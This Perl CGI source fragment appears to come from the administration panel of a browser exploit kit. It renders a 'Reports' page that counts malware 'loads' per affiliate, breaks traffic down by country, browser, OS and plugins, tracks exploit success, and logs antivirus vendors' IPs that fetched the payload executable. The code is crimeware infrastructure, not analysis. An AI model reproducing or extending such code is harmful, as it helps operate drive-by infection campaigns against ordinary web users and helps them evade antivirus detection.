	$ref_loads .= "$raw_pass2 " . '(' . $passed . ')'  . '<br>' . "\n";
      }

      $texttoprint = "
	  <a href=\"xplstats.pl?cook=$cook&q=loads&selectuser=$selectuser&vfy=xplad\">Loads</a> | <a href=\"xplstats.pl?cook=$cook&q=ref&selectuser=$selectuser&vfy=xplad\">Referers</a> | <a href=\"xplstats.pl?cook=$cook&q=sites&selectuser=$selectuser&vfy=xplad\">Referal Sites</a> | <a href=\"xplstats.pl?cook=$cook&q=ctry&selectuser=$selectuser&vfy=xplad\">Countries</a> | <a href=\"xplstats.pl?cook=$cook&q=browser&selectuser=$selectuser&vfy=xplad\">Browsers</a> | <a href=\"xplstats.pl?cook=$cook&q=os&selectuser=$selectuser&vfy=xplad\">OS</a> | <a href=\"xplstats.pl?cook=$cook&q=arch&selectuser=$selectuser&vfy=xplad\">Arch</a> | <a href=\"xplstats.pl?cook=$cook&q=lang&selectuser=$selectuser&vfy=xplad\">Lang</a> | <a href=\"xplstats.pl?cook=$cook&q=plugs&selectuser=$selectuser&vfy=xplad\">Plugins</a> | <a href=\"xplstats.pl?cook=$cook&q=xplc&selectuser=$selectuser&vfy=xplad\">Exploits</a> | Antivirus Connections <br>
     <DIV id=\"main\">
     <DIV class=\"content\">
     <DIV id=\"pages\">
     <DIV id=\"home\">
     <DIV>
     </DIV>
     <center>
     <table COLS=2 WIDTH=\"800\" >
     <tr VALIGN=TOP>
     <td>
     <b>Antivirus IP</b>
     <br>
     </td>
     <td>
     <b>Country</b>
     <br>
     </td>
     <td>
     <b>Organisation</b>
     <br>
     </td>
     <td>
     <b>Page Accessed (exe loaded)</b>
     <br>
     </td>
     </tr>
     <tr>
     <center>
     <img src=\"images/gotop.png\"></img>

     </center>
     </tr>
     <td>
     $real_ref <br>
     </td>
     <td>
     $ref_total <br>
     </td>
     <td>
     $ref_org <br>
     </td>
     <td>
     $ref_loads <br>
     </td>
     </table>"
    }

    if($stats ne 'honey' and $stats ne 'xplc')
    {
      $choiceoptionup = '<form method="post">' . "\n";
      $choiceoptionup .= '<SELECT name="selectuser" ONCHANGE="location = this.options[this.selectedIndex].value;">' . "\n";
      $choiceoptiondown = '</SELECT>' . "\n";
      $choiceoptiondown .= "<input type=\"hidden\" name=\"cook\" value=\"$cook\">\n";
      $choiceoptiondown .= "<input type=\"hidden\" name=\"stats\" value=\"$stats\">\n";
      $choiceoptiondown .= "<input type=\"hidden\" name=\"vfy\" value=\"xplad\">\n";
      $choiceoptiondown .= "</form>\n";

      #Select the Users from the DB
      $sql = "SELECT * FROM affiliates";
      $statement = $dbh->prepare($sql) or die "Couldn't prepare query '$sql': $DBI::errstr\n";
      $results = $dbh->selectall_hashref("SELECT * FROM affiliates", 'username');
      foreach my $people (keys %$results)
      {
        if($selectuser eq $people)
	{
	  $choiceoption .= '<option selected="yes" value="xplstats.pl?vfy=xplad&cook=' . $cook . '&q=' . $stats . '&selectuser=' . $people . '">' . $people . '</option>' . "\n";
	}
        else
	{
	  $choiceoption .= '<option value="xplstats.pl?vfy=xplad&cook=' . $cook . '&q=' . $stats . '&selectuser=' . $people . '">' . $people . '</option>' . "\n";
	}
      }
    }
    else
    {
      $choiceoption = '<b>Only Stats for all traffic are available</b><br>';
    }


    print $q->header(-cache_control=>"no-cache, no-store, must-revalidate");
    indexalltab();
  }

sub indexalltab
{
 print <<THEHTMLINDEX;
 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<HTML xmlns="http://www.w3.org/1999/xhtml" lang="fr"><HEAD><META http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">

<TITLE>$config{NetName} - Admin Stats</TITLE>
    <LINK rel="stylesheet" type="text/css" href="style/style3.css" media="all">
    
</HEAD><BODY>
<DIV id="top_nav">
	<DIV class="content">
    
        <UL>
            <LI><A href="xplindex.pl?cook=$cook&vfy=xplad" title="Home" class="Home">Home</A></LI>
            <LI><A href="xplstats.pl?cook=$cook&vfy=xplad" title="Reports">Reports</A></LI>
            <LI><A href="xplprograms.pl?cook=$cook&selectuser=Admin&vfy=xplad" title="Accounts">Accounts</A></LI>
	    <LI><A href="xploptions.pl?cook=$cook&selectuser=$selectuser&vfy=xplad" title="Exploits Options">Exploits</A></LI>
	    <LI><A href="xpltraffic.pl?cook=$cook&selectuser=$selectuser&vfy=xplad" title="Traffic Options">Traffic</A></LI>
            <LI><A href="xplavs.pl?cook=$cook&selectuser=$selectuser&vfy=xplad" title="AVs Check">AV Check</A></LI>
            <LI><A href="login.pl?action=logout" title="Log Out">Log Out</A></LI>
        </UL>
        
    </DIV>
</DIV>
<p align=right><font size=3><font color=red>*</font> $name report </font></p>
<center>
<br>
<h2>[ Reports ]</h2><br><br>
<center>
$choiceoptionup
$choiceoption
$choiceoptiondown
</center><br>
$texttoprint
</center>
<br><br>
</DIV>
</DIV>
</DIV>
</DIV>

<br><br>

</center>
<DIV id="footer">
	<DIV class="content">
        <DIV class="copyright">
        	<P><BR>
        </DIV>        
    </DIV>
</DIV>

</body>
</html>
 
 
THEHTMLINDEX
}

1;
